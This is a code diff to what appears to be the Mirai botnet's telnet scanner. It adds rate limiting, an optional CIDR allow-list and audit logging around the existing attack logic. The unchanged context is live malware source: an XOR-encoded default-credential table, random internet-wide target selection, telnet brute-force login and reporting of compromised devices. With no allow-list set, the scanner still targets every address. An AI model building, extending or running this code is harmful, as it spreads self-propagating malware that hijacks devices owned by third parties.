@@ -26,6 +26,7 @@
 #include "util.h"
 #include "checksum.h"
 #include "resolv.h"
+#include "attack.h"
 
 int scanner_pid, rsck, rsck_out, auth_table_len = 0;
 char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
@@ -33,6 +34,86 @@ struct scanner_auth *auth_table = NULL;
 struct scanner_connection *conn_table;
 uint16_t auth_table_max_weight = 0;
 uint32_t fake_time = 0;
+
+// Rate limiting variables
+static uint32_t scanner_rate_limit = 0;
+static uint32_t scanner_conn_this_sec = 0;
+static time_t scanner_rate_window = 0;
+
+// CIDR authorization variables
+#define MAX_AUTHORIZED_CIDRS 32
+static struct {
+    uint32_t network;
+    uint32_t netmask;
+} authorized_cidrs[MAX_AUTHORIZED_CIDRS];
+static int authorized_cidr_count = 0;
+
+static void scanner_audit_log(const char *event, const char *detail)
+{
+    time_t now = time(NULL);
+    struct tm *timeinfo = localtime(&now);
+    char timestamp[32];
+    
+    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", timeinfo);
+    fprintf(stderr, "[SCANNER AUDIT] %s | EVENT=%s | DETAIL=%s\n", timestamp, event, detail ? detail : "");
+}
+
+static void scanner_parse_authorized_cidrs(const char *cidr_str)
+{
+    char *copy, *saveptr, *token;
+    
+    if (!cidr_str || cidr_str[0] == '\0')
+    {
+        authorized_cidr_count = 0;
+        return;
+    }
+    
+    copy = malloc(strlen(cidr_str) + 1);
+    strcpy(copy, cidr_str);
+    
+    authorized_cidr_count = 0;
+    token = strtok_r(copy, ",", &saveptr);
+    
+    while (token && authorized_cidr_count < MAX_AUTHORIZED_CIDRS)
+    {
+        uint32_t network, netmask;
+        uint8_t o1, o2, o3, o4, prefix;
+        int parsed;
+        
+        parsed = sscanf(token, "%hhu.%hhu.%hhu.%hhu/%hhu", &o1, &o2, &o3, &o4, &prefix);
+        if (parsed == 5 && prefix <= 32)
+        {
+            network = INET_ADDR(o1, o2, o3, o4);
+            netmask = (prefix == 0) ? 0 : (0xFFFFFFFFU << (32 - prefix));
+            
+            authorized_cidrs[authorized_cidr_count].network = network & htonl(netmask);
+            authorized_cidrs[authorized_cidr_count].netmask = htonl(netmask);
+            authorized_cidr_count++;
+        }
+        
+        token = strtok_r(NULL, ",", &saveptr);
+    }
+    
+    free(copy);
+}
+
+static int scanner_ip_is_authorized(uint32_t ip_nbo)
+{
+    int i;
+    
+    // If no CIDRs configured, allow all IPs (original behavior)
+    if (authorized_cidr_count == 0)
+        return 1;
+    
+    // Check if IP matches any authorized CIDR
+    for (i = 0; i < authorized_cidr_count; i++)
+    {
+        if ((ip_nbo & authorized_cidrs[i].netmask) == authorized_cidrs[i].network)
+            return 1;
+    }
+    
+    return 0;
+}
 
 int recv_strip_null(int sock, void *buf, int len, int flags)
 {
@@ -184,13 +265,48 @@ void scanner_init(void)
     add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
     add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
 
+    // Initialize rate limiting from environment
+    char *rate_limit_env = getenv("SCANNER_RATE_LIMIT");
+    if (rate_limit_env)
+    {
+        scanner_rate_limit = (uint32_t)atoi(rate_limit_env);
+    }
+    else
+    {
+        scanner_rate_limit = 0; // Unlimited
+    }
+    scanner_conn_this_sec = 0;
+    scanner_rate_window = time(NULL);
+
+    // Initialize authorized CIDR ranges from environment
+    char *cidr_env = getenv("SCANNER_AUTHORIZED_CIDR");
+    if (cidr_env)
+    {
+        scanner_parse_authorized_cidrs(cidr_env);
+    }
+
+    // Audit log initialization
+    char audit_detail[256];
+    if (scanner_rate_limit > 0)
+    {
+        snprintf(audit_detail, sizeof(audit_detail), 
+                 "rate_limit=%u connections/sec, authorized_cidrs=%d", 
+                 scanner_rate_limit, authorized_cidr_count);
+    }
+    else
+    {
+        snprintf(audit_detail, sizeof(audit_detail), 
+                 "rate_limit=unlimited, authorized_cidrs=%d", 
+                 authorized_cidr_count);
+    }
+    scanner_audit_log("SCANNER_INIT", audit_detail);
 
 #ifdef DEBUG
     printf("[scanner] Scanner process initialized. Scanning started.\n");
 #endif
 
     // Main logic loop
-    while (TRUE)
+    while (attack_should_continue())
     {
         fd_set fdset_rd, fdset_wr;
         struct scanner_connection *conn;
@@ -211,6 +327,18 @@ void scanner_init(void)
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
                 iph->daddr = get_random_ip();
+
+                // Check if IP is authorized
+                if (!scanner_ip_is_authorized(iph->daddr))
+                {
+                    char ip_str[32];
+                    snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
+                             iph->daddr & 0xff, (iph->daddr >> 8) & 0xff,
+                             (iph->daddr >> 16) & 0xff, (iph->daddr >> 24) & 0xff);
+                    scanner_audit_log("SCANNER_IP_REJECTED", ip_str);
+                    continue;
+                }
+
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
@@ -284,6 +412,28 @@ void scanner_init(void)
             // If there were no slots, then no point reading any more
             if (conn == NULL)
                 break;
+
+            // Rate limiting check
+            if (scanner_rate_limit > 0)
+            {
+                time_t current_time = fake_time;
+                if (current_time != scanner_rate_window)
+                {
+                    // New second window
+                    scanner_rate_window = current_time;
+                    scanner_conn_this_sec = 0;
+                }
+                
+                if (scanner_conn_this_sec >= scanner_rate_limit)
+                {
+                    char rate_detail[64];
+                    snprintf(rate_detail, sizeof(rate_detail), 
+                             "limit=%u connections/sec reached", scanner_rate_limit);
+                    scanner_audit_log("SCANNER_RATE_LIMITED", rate_detail);
+                    break; // Stop processing new connections this second
+                }
+                scanner_conn_this_sec++;
+            }
 
             conn->dst_addr = iph->saddr;
             conn->dst_port = tcph->source;
@@ -609,6 +759,18 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
 #endif
+                                // Audit log for successful login
+                                char login_detail[128];
+                                snprintf(login_detail, sizeof(login_detail),
+                                         "ip=%d.%d.%d.%d port=%u user=%s",
+                                         conn->dst_addr & 0xff,
+                                         (conn->dst_addr >> 8) & 0xff,
+                                         (conn->dst_addr >> 16) & 0xff,
+                                         (conn->dst_addr >> 24) & 0xff,
+                                         ntohs(conn->dst_port),
+                                         conn->auth->username);
+                                scanner_audit_log("SCANNER_LOGIN_SUCCESS", login_detail);
+                                
                                 report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                 close(conn->fd);
                                 conn->fd = -1;
